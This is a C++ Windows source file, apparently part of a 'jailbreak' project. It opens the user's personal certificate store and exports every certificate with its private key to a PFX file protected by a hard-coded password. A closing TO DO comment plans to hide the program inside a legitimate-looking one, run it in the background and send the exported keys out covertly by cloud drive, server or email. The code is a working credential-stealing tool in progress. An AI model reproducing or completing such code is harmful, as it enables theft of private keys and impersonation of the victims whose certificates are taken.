// jbstore2.cpp : Defines the entry point for the console application.
//

//#include "stdafx.h"
#include <string>
#include <windows.h>
#include <tchar.h>
#include <wincrypt.h>
#pragma comment (lib, "crypt32") //important !! dont work without linking library

//exe generated at jailbreak-master/jailbreak-master/Debug/jbstore2_32.exe
/*
void ListOfCerts(HCERTSTORE hStore) {
    PCCERT_CONTEXT pCertContext;
    pCertContext = CertEnumCertificatesInStore(hStore, NULL);
    while (pCertContext) {
        if (pCertContext) {
            //PrintCertInfo(pCertContext);
            DWORD dwData, n;
            TCHAR* pName = NULL;

            // Get Subject name size.
            if (!(dwData = CertGetNameString(pCertContext, CERT_NAME_SIMPLE_DISPLAY_TYPE, 0, NULL, NULL, 0))) {
                printf("CertGetNameString error: %d\n", GetLastError());
                goto cleanup;
            }

            // Allocate memory for subject name.
            pName = (TCHAR*)calloc(sizeof(TCHAR), dwData);

            if (!pName) {
                printf("Unable to allocate memory for subject name: %d\n", GetLastError());
                goto cleanup;
            }

            // Get subject name.
            if (!(CertGetNameString(pCertContext, CERT_NAME_SIMPLE_DISPLAY_TYPE, 0, NULL, pName, dwData))) {
                printf("CertGetNameString error: %d\n", GetLastError());
                goto cleanup;
            }

            // Print Subject Name.
            printf("Subject Name: %S\n", pName);

            printf("Serial Number: ");
            dwData = pCertContext->pCertInfo->SerialNumber.cbData;
            for (n = 0; n < dwData; n++) {
                printf("%02X ", pCertContext->pCertInfo->SerialNumber.pbData[dwData - (n + 1)]);
            }
            printf("\n\n");

        cleanup:
            if (pName)
                free(pName);
        }
        pCertContext = CertEnumCertificatesInStore(hStore, pCertContext);
    }

}
*/
BOOL DumpAllCertificates(HCERTSTORE hStore, LPCWSTR password = L"heslo")
{
    BOOL bResult = FALSE;
    CRYPT_DATA_BLOB Blob = {};
    HANDLE hFile = NULL;
    DWORD dwBytesWritten = 0;
    LPCWSTR filename = L"./allcerts.pfx";

    if (!PFXExportCertStoreEx(hStore, &Blob, password, NULL, EXPORT_PRIVATE_KEYS)) {//| REPORT_NOT_ABLE_TO_EXPORT_PRIVATE_KEY
        printf("Error with exporting certificates err: %d\n", GetLastError());

        return FALSE;
    }

    Blob.pbData = (PBYTE)HeapAlloc(GetProcessHeap(), 0, Blob.cbData);
    if (!Blob.pbData)
    {
        printf("Error allocating data err: %d\n", GetLastError());
        goto cleanup;
    }

    if (!PFXExportCertStoreEx(hStore, &Blob, password, NULL, EXPORT_PRIVATE_KEYS)) { //| REPORT_NOT_ABLE_TO_EXPORT_PRIVATE_KEY
        printf("Error exporting certificates: %d\n", GetLastError());
        goto cleanup;
    }

    hFile = CreateFile(filename, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, 0);
    if (hFile == INVALID_HANDLE_VALUE) {
        printf("Error creating output file: %d\n", GetLastError());
        goto cleanup;
    }

    if (!WriteFile(hFile, Blob.pbData, Blob.cbData, &dwBytesWritten, 0)) {
        printf("Error writing to file: %d\n", GetLastError());
        goto cleanup;
    }

    if (dwBytesWritten != Blob.cbData) {
        printf("Number of bytes written does not match requested!\n");
        goto cleanup;
    }

    printf("Done.... Output written to file  %S\n", filename);
    bResult = TRUE;

cleanup:
    if (hFile != INVALID_HANDLE_VALUE) CloseHandle(hFile);
    if (Blob.pbData) HeapFree(GetProcessHeap(), 0, Blob.pbData);
    return bResult;
}

//making my own program:

int main(int argc, _TCHAR* argv[])
{
    HCERTSTORE hStore = NULL;

    printf("Welcome in opening store program for exporting certificates.");
    //open store

    hStore = CertOpenSystemStore(NULL, L"MY");
    if (!hStore) {
        printf("Error opening cert store: %d\n", GetLastError());
    }
    else {
        printf("Openede\n");
    }

    //list certificates:
    //printf("List of Certificates:\n");
    //ListOfCerts(hStore);

    //dump all certs to one file
    printf("\n\nDumping all certificates:\n");
    DumpAllCertificates(hStore);

}

// TO DO:
/*
+ disable showing cmd or fake what it is doing.... hide in some legit program.
+ transfer exported certificate (try to be hidden) (google disk, server, email, others....).
+ make program to look it is doing something else and do this on the background.
*/